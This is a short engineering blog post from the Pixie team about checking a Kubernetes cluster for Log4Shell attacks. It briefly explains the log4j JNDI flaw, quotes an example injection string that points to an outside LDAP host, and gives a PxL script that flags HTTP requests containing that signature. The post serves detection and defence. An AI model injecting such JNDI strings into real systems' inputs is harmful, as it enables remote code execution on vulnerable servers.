---
path: '/did-i-get-owned-by-log4shell'
title: 'Did I get owned by Log4Shell?'
date: 2021-12-10T06:00:00.000+00:00
featured_image: sos-emergency-exit.png
categories: ['Pixie Team Blogs']
authors: ['Omid Azizi', 'James Bartlett', 'Vihang Mehta']
emails: ['oazizi@pixielabs.ai', 'jamesbartlett@pixielabs.ai', 'vihang@pixielabs.ai']
---
 
Earlier today, news broke about a serious 0-day exploit in the popular Java logging library `log4j`. The exploit – called `Log4Shell` – allows remote code execution (RCE) by entering certain strings into the log statement. This can be a serious security vulnerability if a server logs the inputs it receives over a public endpoint.

In this post, we'll show how we used Pixie to quickly check for `Log4Shell` attacks in our Kubernetes cluster.

## How Does Log4Shell Work?
In a nutshell, the `Log4Shell` exploit means that if a string containing a substring of the form `${jndi:ldap://1.1.1.1/a}`  is logged, then you may be exposed to a RCE attack. When this string is logged, `log4j` will make a request to the IP, and get a reference to a class file which will then get loaded into your Java application with JNDI. This means your Java application could then be used to execute arbitrary code of the attacker's choice.

Our goal is not to go into too much detail on `Log4Shell`, since others have already done a great job of that. Instead we're going to focus on how Pixie helped us identify whether we were under attack.

For more details on `Log4Shell`, you can check out this blog, which does a good job of explaining the exploit and mitigation: https://www.lunasec.io/docs/blog/log4j-zero-day.

## Are we being attacked?

We don't deploy Java services at Pixie so we were confident that this wasn't an issue for us. But the team was still curious about whether anyone was trying to attack us. Within minutes, a member of our team, James, put out this PxL script which checks for instances of the `Log4Shell` exploit:

```python
import px
 
# Get all HTTP requests automatically traced by Pixie.
df = px.DataFrame('http_events')
 
# Get the pod the HTTP request was made to.
df.pod = df.ctx['pod']
 
# Check HTTP requests for the exploit signature.
df.contains_log4j_exploit = px.contains(df.req_headers, '${jndi') or px.contains(df.req_body, '${jndi')
 
# Filter on requests that are attacking us with the exploit.
df = df[df.contains_log4j_exploit]
 
df = df[['time_', 'remote_addr', 'remote_port', 'req_headers', 'req_method', 'req_path', 'pod']]
 
px.display(df)
```

<svg title="Pixie automatically traces all HTTP traffic flowing through your K8s cluster. Checking the HTTP request headers for the exploit signature exposes numerous attack requests on our staging cluster." src='jndi-http-logs.png' />

<svg title="The contents of one of the HTTP attack requests. Note the '${jndi' exploit signature with originating IP address." src='jndi-referrer-details.png' />

Questions? Find us on [Slack](https://slackin.px.dev/) or Twitter at [@pixie_run](https://twitter.com/pixie_run).
